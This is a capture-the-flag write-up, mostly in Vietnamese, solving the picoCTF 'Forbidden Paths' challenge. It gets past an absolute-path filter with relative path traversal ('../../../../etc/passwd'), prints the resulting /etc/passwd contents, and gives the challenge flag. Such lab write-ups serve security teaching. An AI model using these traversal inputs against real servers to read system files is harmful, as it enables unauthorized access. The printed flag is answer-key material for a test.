# Write-up : Forbidden Paths 
---
### Description :
> Can you get the flag?
> We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?
### Hint :
> none
---
### Solution :
- Ngay từ mô tả của bài ta có thể thấy 1 đường dẫn `` /usr/share/nginx/html/ ``, nhìn khá là quen mắt
- Có thể đó là 1 đường dẫn đến thư mục html của linux, tôi thử tìm đường dẫn đó trong linux thì có xuất hiện và tôi thử mở 1 file trong đường dẫn đó thì trên trình duyệt có đường dẫn là ``` file:///usr/share/nginx/html/index.html ```
- Thử đọc các file cho sẵn thì hoàn toàn bình thường nhưng đọc file /flag.txt thì hoàn toàn không được vì bị filter đi 
#### Kết luận : có cho phép người dùng đọc file từ 1 đường dẫn URL đến file đó ( dự đoán ) 
> Nếu đọc file qua đường dẫn URL và dùng linux thì có khả năng bị `` Path Traversal ``
> Ta biết thêm website ở trong đường dẫn `` /usr/share/nginx/html/ ``

Test thử với đường dẫn URL là `` file:///../../../../etc/passwd `` thì có kết quả trả về là :
> Vì có khả năng các thư mục được lưu từ vị trí của website trở đi nên tôi đoán rằng file `` /etc/passwd `` có thể là cùng cấp với cấp thư mục con của đường dẫn đó.
```bash
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```
Tuyệt vời! 
Vậy thì lỗi `` Path Traversal `` có hoạt động, việc của chúng ta bây giờ chỉ cần tìm file `` /flag.txt ``
Thử với đường dẫn : ``` file:///../../../../flag.txt ``` thì ta nhận được flag của bài.
### Flag : `` picoCTF{7h3_p47h_70_5ucc355_6db46514} `` 
